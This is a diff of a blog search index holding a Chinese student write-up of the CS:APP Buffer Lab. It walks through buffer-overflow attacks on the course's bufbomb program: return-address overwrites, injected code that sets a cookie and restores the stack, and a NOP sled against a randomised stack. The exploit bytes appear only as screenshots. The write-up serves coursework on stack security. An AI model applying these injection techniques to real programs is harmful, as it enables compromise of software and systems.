-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> global_value = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (global_value == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Bang!: You set global_value to 0x%x\n&quot;</span>, global_value);</span><br><span class="line">		validate(<span class="number">2</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: global_value = 0x%x\n&quot;</span>, global_value);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>与Level 0和Level 1类似，我们的任务是让<code>bufbomb</code>执行<code>bang</code>函数。</p>
-<p>不同的是，我们要将全局变量<code>global_value</code>设置成userid对应的cookie</p>
-<p>作者给出的建议：</p>
-<ul>
-<li>你可以通过GDB来获取信息来构造你的exploit string</li>
-<li>手工确定指令序列的字节编码非常繁琐易错，我们通过编写包含想要放入栈中的指令和数据的汇编代码让工具去做所有的工作。</li>
-<li>exploit string取决于自己的机器、自己的编译器以及cookie</li>
-<li>不要试图使用jmp或call指令去跳转到<code>bang</code>的地址，因为这些指令使用相对PC寻址，很难设置正确。因此需要将地址压入栈中。</li>
-</ul>
-<h4 id="题解：-2"><a href="#题解：-2" class="headerlink" title="题解："></a>题解：</h4><ul>
-<li><p>查看<code>bufbomb</code>的汇编代码，<code>bang</code>函数的地址是<code>0x08048d52</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604100834183.png" alt="image-20210604100834183"></p>
-</li>
-<li><p>查看<code>bang</code>的汇编代码，找到<code>global_value</code>的地址<code>0x804d10c</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604141946443.png" alt="image-20210604141946443"></p>
-</li>
-<li><p>要将<code>global_value</code>的值设置成cookie然后再执行<code>bang</code>函数，我们编写如下汇编代码去实现它<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604142631247.png" alt="image-20210604142631247"></p>
-</li>
-<li><p>因为不能直接传入汇编代码，我们用gcc得到对应的二进制文件，objdump反汇编得到它的机器码<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604142605461.png" alt="image-20210604142605461"></p>
-</li>
-<li><p>为了执行这些代码，我们需要知道<code>buf</code>数组的首地址，也就是<code>getbuf</code>函数里的<code>ebp-0x28</code>，使用GDB得到这个地址为<code>0x55682fb8</code></p>
-<p><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604151933110.png" alt="image-20210604151933110"></p>
-</li>
-<li><p>所以构造exploit string如图所示：<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604152555659.png" alt="image-20210604152555659"></p>
-</li>
-<li><p>验证，符合预期结果，Level 2完成<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604152527883.png" alt="image-20210604152527883"></p>
-</li>
-</ul>
-<h3 id="Level-3-Dynamite-20-pts"><a href="#Level-3-Dynamite-20-pts" class="headerlink" title="Level 3: Dynamite(20 pts)"></a>Level 3: Dynamite(20 pts)</h3><h4 id="Level-3说明："><a href="#Level-3说明：" class="headerlink" title="Level 3说明："></a>Level 3说明：</h4><p>我们之前的攻击都导致程序跳转到其他函数的代码，然后导致程序退出。因此，使用破坏堆栈的exploit string来覆盖保存的值是可以接受的。</p>
-<p>最复杂形式的缓冲区溢出攻击会导致程序执行一些漏洞利用代码，这些代码会改变程序的寄存器/内存状态，但会使程序返回到原始调用函数(本例中为<code>test</code>)。调用函数对攻击视而不见。不过，这种攻击方式很棘手，因为您必须:1)将机器代码放到堆栈上，2)将返回指针设置到该代码的开头，3)撤销对堆栈状态的任何破坏。</p>
-<p>您在这个级别的任务是提供一个exploit string，它将导致<code>getbuf</code>返回您的cookie进行测试，而不是值1。您可以在测试代码中看到，完成的话将导致程序成功运行“Bomb！”。您的漏洞代码应该将您的cookie设置为<code>getbuf</code>返回值，恢复任何损坏的状态，在堆栈上压入正确的返回位置，并执行<code>ret</code>指令以真正返回到<code>test</code>。</p>
-<p>作者的建议：</p>
-<ul>
-<li>您可以使用GDB获得构建漏洞字符串所需的信息。在<code>getbuf</code>中设置一个断点并运行到该断点。确定参数，如保存的返回地址。</li>
-<li>手工确定指令的机器码既繁琐又容易出错。您可以通过编写包含要放入堆栈的指令和数据的汇编代码文件，让工具来完成所有的工作。用GCC汇编这个文件，用OBJDUMP拆解。您应该能够获得您将在提示符下键入的确切字节序列。</li>
-<li>请记住，您的exploit string取决于您的机器、编译器，甚至您的userid的cookie。</li>
-</ul>
-<p>一旦你完成了这一关，停下来反思一下你已经完成了什么。你让一个程序执行你自己设计的机器代码。你这样做的方式足够隐秘，以至于程序没有意识到有什么不对劲。</p>
-<h4 id="题解：-3"><a href="#题解：-3" class="headerlink" title="题解："></a>题解：</h4><ul>
-<li><p>我们这一Level的思路是：因为<code>getbuf</code>的返回值保存在eax里，然后赋给<code>val</code>，所以我们只需要执行构造的代码将eax里面的值修改为cookie，同时将赋值指令的地址压入栈中，然后用ret指令返回地址，正常去执行<code>test</code>的剩余指令。</p>
-</li>
-<li><p>查看<code>test</code>的汇编代码，将<code>getbuf</code>返回值赋给<code>val</code>的指令的地址是<code>0x8048e50</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604171307444.png" alt="image-20210604171307444"></p>
-</li>
-<li><p>编写汇编代码实现改写eax的值、压入地址、返回地址，如图所示：</p>
-<p><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604172403658.png" alt="image-20210604172403658"></p>
-</li>
-<li><p>gcc编译成可重定位目标文件，objdump查看机器码<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604174037448.png" alt="image-20210604174037448"></p>
-</li>
-<li><p>为了还原栈，查看调用<code>getbuf</code>时的旧的ebp<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604181743588.png" alt="image-20210604181743588"></p>
-</li>
-<li><p>构造exploit string，如图所示：<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604184022787.png" alt="image-20210604184022787"></p>
-</li>
-<li><p>验证，预期结果符合，Level 3完成<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604184002866.png" alt="image-20210604184002866"></p>
-</li>
-</ul>
-<h3 id="Level-4-Nitroglycerin-10-pts"><a href="#Level-4-Nitroglycerin-10-pts" class="headerlink" title="Level 4: Nitroglycerin(10 pts)"></a>Level 4: Nitroglycerin(10 pts)</h3><h4 id="Level-4说明："><a href="#Level-4说明：" class="headerlink" title="Level 4说明："></a>Level 4说明：</h4><p>请注意：您需要使用“-n”命令行选项来运行这关。</p>
-<p>从一次运行到另一次运行，尤其是由不同的用户运行，给定过程使用的确切堆栈位置会有所不同。这种变化的一个原因是，当程序开始执行时，所有环境变量的值都放在堆栈底部附近。环境变量存储为字符串，根据它们的值需要不同的存储量。因此，为给定用户分配的堆栈空间取决于他或她的环境变量的设置。在GDB下运行程序时，栈的位置也不同，因为GDB为自己的一些状态使用栈空间</p>
-<p>在调用getbuf的代码中，我们加入了稳定堆栈的特性，因此getbuf的堆栈框架的位置在两次运行之间是一致的。这使得您可以在知道<code>buf</code>的确切起始地址的情况下编写一个攻击字符串。如果你试图在一个正常的程序上使用这样的漏洞，你会发现它有时会起作用，但在其他时候会导致分段错误。因此得名“炸药”——阿尔弗雷德·诺贝尔开发的一种炸药，含有稳定元素，使其不太容易发生意外爆炸。</p>
-<p>对于这个级别，我们走了相反的方向，使堆栈位置比平时更不稳定。因此得名“硝化甘油”——一种出了名的不稳定炸药</p>
-<p>当你用命令行标志“-n”运行<code>BUFFAMBOM</code>时，它将在“硝基”模式下运行。该程序不是调用函数<code>getbuf</code>，而是调用一个略有不同的函数<code>getbufn</code>：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Buffer size for getbufn */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KABOOM_BUFFER_SIZE 512</span></span><br></pre></td></tr></table></figure>
-
-<p>这个函数类似于<code>getbuf</code>，只是它有一个512个字符的缓冲区。您将需要这个额外的空间来创建一个可靠的漏洞。调用<code>getbufn</code>的代码首先在堆栈上分配一个随机的存储量，这样，如果您在<code>getbufn</code>的两次连续执行期间对%ebp的值进行采样，您会发现它们相差多达240。</p>
-<p>此外，当在硝基模式下运行时，BUFBOMB要求您提供您的字符串5次，它将执行<code>getbufn</code>5次，每次都有不同的堆栈偏移量。您的利用字符串必须使它每次都返回您的cookie。</p>
-<p>您的任务与Level 3级别的任务相同。同样，您在这个级别的工作是提供一个漏洞利用字符串，它将导致<code>getbufn</code>返回您的cookie进行测试，而不是值1。您可以在测试代码中看到，这将导致程序运行“KABOOM！”您的漏洞代码应该将您的cookie设置为返回值，恢复任何损坏的状态，在堆栈上推送正确的返回位置，并执行ret指令以真正返回testn。</p>
-<p>作者建议：</p>
-<ul>
-<li>您可以使用HEX2RAW程序发送漏洞字符串的多个副本。如果文件exploit.txt中只有一个副本，则可以使用以下命令:<br><code>unix&gt; cat exploit.txt | ./hex2raw -n | ./bufbomb -n -u bovik</code></li>
-<li>诀窍是利用nop指令。它用一个字节(代码0x90)编码。在CS:APP2e教材的第262页上阅读关于“nop sleds”的内容可能会有所帮助</li>
-</ul>
-<h4 id="题解：-4"><a href="#题解：-4" class="headerlink" title="题解："></a>题解：</h4><ul>
-<li><p>查看<code>getbufn</code>函数的汇编代码，缓冲区首地址为<code>ebp-0x208</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604200855918.png" alt="image-20210604200855918"></p>
-</li>
-<li><p>查看<code>testn</code>将<code>eax</code>返回值赋给<code>val</code>的指令地址为<code>0x8048ce2</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604200930760.png" alt="image-20210604200930760"></p>
-</li>
-<li><p>我们这一题的思路是：因为这一等级缓冲区首地址会变化，所以我们不能直接GDB调试去得到一个确切的起始地址，我们需要用到nop指令，将有效机器指令尽可能往较大的地址处放，前面填充nop指令，这样跳转到哪里我们都能成功执行我们的恶意代码。</p>
-</li>
-<li><p>因为要恢复ebp存储<code>testn</code>的帧指针，查看<code>testn</code>的汇编代码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov %esp,%ebp</span><br><span class="line"># 此时esp和ebp相等</span><br><span class="line">push %ebx</span><br><span class="line"># 此时ebp=esp+0x4</span><br><span class="line">sub $0x24,%esp</span><br><span class="line"># 这个时候执行完后，ebp=esp+0x28，这就是esp和ebp每次的变化关系，通过esp来恢复我们的每次的ebp</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604235350148.png" alt="image-20210604235350148"></p>
-</li>
-<li><p>编写恶意代码实现恢复ebp、cookie作为返回值、下一条指令地址压入栈中、返回地址出栈。<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604212313389.png" alt="image-20210604212313389"></p>
-</li>
-<li><p>gcc和objdump得到代码的字节序列。<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604212418838.png" alt="image-20210604212418838"></p>
-</li>
-<li><p>gcc得到大概的几个首地址，这里取的是最大的<code>0x55682e48</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604212514423.png" alt="image-20210604212514423"></p>
-</li>
-<li><p>构造exploit string<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604212346929.png" alt="image-20210604212346929"></p>
-</li>
-<li><p>验证，成功，实验结束。<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604212437957.png" alt="image-20210604212437957"></p>
-</li>
-</ul>
-<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>这次实验时间很紧张，主要是我的原因，到现在终于圆满完成，还是值得庆祝的。</p>
-<p>花费时间最长的部分其实是英文文档的阅读，读起来太过吃力。</p>
-<p>这个实验让我对缓冲溢出漏洞有了直观的认识，重新复习了栈的原理，了解了易于遭受缓冲区攻击代码的危险性。</p>
-<p>作业要早早完成，不然会掉头发的。</p>
-]]></content>
-      <categories>
-        <category>CS:APP</category>
-      </categories>
-      <tags>
-        <tag>课程作业</tag>
-        <tag>Lab</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>深入理解计算机系统——LAB-3_BombLab</title>
     <url>/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/</url>
     <content><![CDATA[<h1 id="深入理解计算机系统——LAB-3-Bomb-Lab"><a href="#深入理解计算机系统——LAB-3-Bomb-Lab" class="headerlink" title="深入理解计算机系统——LAB-3_Bomb_Lab"></a>深入理解计算机系统——LAB-3_Bomb_Lab</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>二进制炸弹实验。</strong></p>
@@ -2601,6 +2346,231 @@ php反序列化漏洞。
       <tags>
         <tag>课程作业</tag>
         <tag>LAB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>深入理解计算机系统——LAB-4_BufLab</title>
+    <url>/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/</url>
+    <content><![CDATA[<h1 id="深入理解计算机系统——LAB-4-Buf-Lab"><a href="#深入理解计算机系统——LAB-4-Buf-Lab" class="headerlink" title="深入理解计算机系统——LAB-4_Buf_Lab"></a>深入理解计算机系统——LAB-4_Buf_Lab</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>缓冲区溢出实验。</strong></p>
+<p>要求学生们通过利用一个<strong>缓冲区溢出漏洞</strong>，来<strong>修改</strong>一个<strong>二进制可执行文件的运行时行为</strong>。</p>
+<p>这个实验教会学生们<strong>栈的原理</strong>，并让他们了解到写那种<strong>易于遭受缓冲区溢出攻击的代码</strong>的<strong>危险性</strong>。</p>
+<h2 id="实验环境和使用工具"><a href="#实验环境和使用工具" class="headerlink" title="实验环境和使用工具"></a>实验环境和使用工具</h2><ul>
+<li><p>主系统 <code>Windows10</code></p>
+</li>
+<li><p>子系统 <code>Windows Subsystem for Linux kali</code></p>
+</li>
+<li><p><code>gdb10.2.1</code>版本</p>
+</li>
+<li><p><code>objdump 2.35.2</code>版本</p>
+</li>
+<li><p><code>VS code</code>编辑器，下载了<code>x86 and x86_64 Assembly</code>插件，提供汇编代码高亮功能</p>
+</li>
+</ul>
+<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="准备过程，查看buflab-writeup-pdf"><a href="#准备过程，查看buflab-writeup-pdf" class="headerlink" title="准备过程，查看buflab-writeup.pdf"></a>准备过程，查看<code>buflab-writeup.pdf</code></h3><p>一共有三个二进制<strong>可执行文件：</strong></p>
+<ul>
+<li><p><code>bufbomb</code>：你将攻击的缓冲区炸弹程序</p>
+<ul>
+<li><p>通过<code>int getbuf()</code>函数从输入中读取字符串</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Buffer size for getbuf */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NORMAL_BUFFER_SIZE 32</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getbuf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[NORMAL_BUFFER_SIZE];</span><br><span class="line">	Gets(buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>容量为32字符的<code>buf</code>字符数组</li>
+<li>其中调用<code>Gets(buf)</code>读取字符串（以<code>\n</code>或文件结束符作为终止符），并将其连同终止符存储到一个目标地址（<code>buf</code>数组中）</li>
+<li>如果字符串长度&lt;=31个字符则正常返回1，反之则返回错误</li>
+</ul>
+</li>
+<li><p><code>bufbomb</code>有几个命令行参数：</p>
+<ul>
+<li><code>-u userid</code>为指定的userid操作炸弹</li>
+<li><code>-h</code>打印命令行参数列表</li>
+<li><code>-n</code>在”Nitro”模式下操作，在Level 4中使用。</li>
+<li><code>-s</code>将解决方案提交给评分服务器</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><code>makecookie</code>：根据userid（用户id）生成一个“cookie”</p>
+<ul>
+<li><p>用法示例：</p>
+ <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unix&gt; ./makecookie bovik</span><br><span class="line"><span class="number">0x1005b2b7</span></span><br></pre></td></tr></table></figure>
+
+</li>
+<li><p>cookie是由8个十六进制数字组成的字符串，不出意外与userid一一对应</p>
+</li>
+<li><p>在五次缓冲区攻击中的四次攻击中，我们的目标是将cookie放在他一般不该出现的地方。</p>
+</li>
+</ul>
+</li>
+<li><p><code>hex2raw</code>：一个帮助在字符串格式之间进行转换的程序</p>
+<ul>
+<li><p>输入两个一组的16进制数字以空格或者换行符分隔，也就是16进制格式的exploit string，转换为ASCII码格式字符串。支持c语言风格的注释</p>
+</li>
+<li><p>你能通过设置一系列管道去通过<code>hex2raw</code>传递字符串：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unix&gt; cat exploit.txt | ./hex2raw | ./bufbomb -u bovik</span><br></pre></td></tr></table></figure></li>
+<li><p>你能存储原始字符串在一个文件，然后通过使用I/O重定向去提交给<code>bufbomb</code>：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unix&gt; ./hex2raw &lt; exploit.txt &gt; exploit-raw.txt</span><br><span class="line">unix&gt; ./bufbomb -u bovik &lt; exploit-raw.txt</span><br></pre></td></tr></table></figure>
+
+<p>在GDB调试内部也能使用这种方法：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unix&gt; <span class="function">gdb <span class="title">bufbomb</span></span></span><br><span class="line"><span class="function"><span class="params">(gdb)</span> run -u bovik &lt; exploit-raw.txt</span></span><br></pre></td></tr></table></figure></li>
+<li><p>注意</p>
+<ul>
+<li><code>0x0A</code>是换行符<code>\n</code>，它会终止字符串读取，所以不能包含<code>0x0A</code>。</li>
+<li>如果要创建字符串<code>0xDEADBEEF</code>，我们应该传递<code>EF BE AD DE</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>接下来是五个Level的说明</p>
+<h3 id="Level-0-Candle-10-pts"><a href="#Level-0-Candle-10-pts" class="headerlink" title="Level 0: Candle(10 pts)"></a>Level 0: Candle(10 pts)</h3><h4 id="Level-0说明："><a href="#Level-0说明：" class="headerlink" title="Level 0说明："></a>Level 0说明：</h4><p><code>getbuf</code>函数被<code>test</code>函数调用，<code>test</code>函数C语言代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> val;</span><br><span class="line">	<span class="comment">/* Put canary on stack to detect possible corruption */</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> local = uniqueval();</span><br><span class="line"></span><br><span class="line">	val = getbuf();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check for corrupted stack */</span></span><br><span class="line">	<span class="keyword">if</span> (local != uniqueval()) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">		validate(<span class="number">3</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>函数调用顺序是<code>test()-&gt;getbuf()-&gt;test()</code>，我们的任务是将其改变为<code>test()-&gt;getbuf()-&gt;smoke()</code>，<code>smoke()</code>函数代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">smoke</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Smoke!: You called smoke()\n&quot;</span>);</span><br><span class="line">	validate(<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>作者给出的一些建议：</p>
+<ul>
+<li>为这个级别设计你的exploit string。你需要的所有信息都可以通过检查<code>BUFBOMB</code>的反汇编版本来确定。使用<code>objdump -d</code>获取其反汇编版本。</li>
+<li>注意字节顺序。</li>
+<li>可以用GDB去逐步执行最后<code>getbuf</code>最后几条指令，确保程序正在做正确的事情。</li>
+<li><code>buf</code>数组在<code>getbuf</code>栈帧中的位置取决于被用来去编译<code>bufbomb</code>程序的gcc的版本，因此我们必须去阅读一些汇编代码来确定它的真正位置</li>
+</ul>
+<h4 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h4><p>反汇编<code>bufbomb</code>程序得到其反汇编版本<code>bufbomb.asm</code></p>
+<p><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603102948513.png" alt="image-20210603102948513"></p>
+<p>查看<code>getbuf</code>函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">08049262 &lt;getbuf&gt;:</span><br><span class="line"> 8049262:	55                   	push   %ebp</span><br><span class="line"> 8049263:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8049265:	83 ec 38             	sub    $0x38,%esp</span><br><span class="line"> 8049268:	8d 45 d8             	lea    -0x28(%ebp),%eax</span><br><span class="line"> 804926b:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 804926e:	e8 bf f9 ff ff       	call   8048c32 &lt;Gets&gt;</span><br><span class="line"> 8049273:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line"> 8049278:	c9                   	leave  </span><br><span class="line"> 8049279:	c3                   	ret    </span><br><span class="line"> 804927a:	90                   	nop</span><br><span class="line"> 804927b:	90                   	nop</span><br><span class="line"> 804927c:	90                   	nop</span><br><span class="line"> 804927d:	90                   	nop</span><br><span class="line"> 804927e:	90                   	nop</span><br><span class="line"> 804927f:	90                   	nop</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看出<code>Gets</code>函数的参数，也就是<code>buf</code>数组的首地址是<code>ebp-0x28</code></p>
+<ul>
+<li>因为<code>0x28=40</code>，所以我们需要先存入40个字符到栈帧中去占用给临时变量预留的空间</li>
+<li>然后再存入4个字符去占用本该是旧的esp存的空间，</li>
+<li>最后构造4个字符去作为返回地址将返回地址修改为<code>smoke</code>函数的地址<code>0x08048e0a</code>，按照小端法排列。</li>
+</ul>
+<p><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603121223800.png" alt="image-20210603121223800"></p>
+<ul>
+<li>因为<code>0x0A</code>不能出现，所以我们修改成<code>0x0B</code>，同样能满足要求。</li>
+<li>最后得到的exploit string如图所示<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603174115683.png" alt="image-20210603174115683"></li>
+<li>验证，与预期结果符合，Level 0完成。<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603192226913.png" alt="image-20210603192226913"></li>
+</ul>
+<h3 id="Level-1-Sparkler-10-pts"><a href="#Level-1-Sparkler-10-pts" class="headerlink" title="Level 1: Sparkler(10 pts)"></a>Level 1: Sparkler(10 pts)</h3><h4 id="Level-1说明："><a href="#Level-1说明：" class="headerlink" title="Level 1说明："></a>Level 1说明：</h4><p><code>bufbomb</code>文件有一个函数<code>fizz</code>，代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fizz</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Fizz!: You called fizz(0x%x)\n&quot;</span>, val);</span><br><span class="line">		validate(<span class="number">1</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called fizz(0x%x)\n&quot;</span>, val);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>与Level 0相似，我们的任务是让<code>bufbomb</code>去执行<code>fizz</code>函数而不是<code>test</code>函数</p>
+<p>不同的是，我们要给函数<code>fizz</code>传入一个参数<code>val</code>，这个参数<code>val</code>要等于userid对应的cookie。</p>
+<p>作者的建议：函数不会调用<code>fizz</code>函数，它只会执行它的代码。这对于我们想在栈帧中放置cookie的位置有提示。</p>
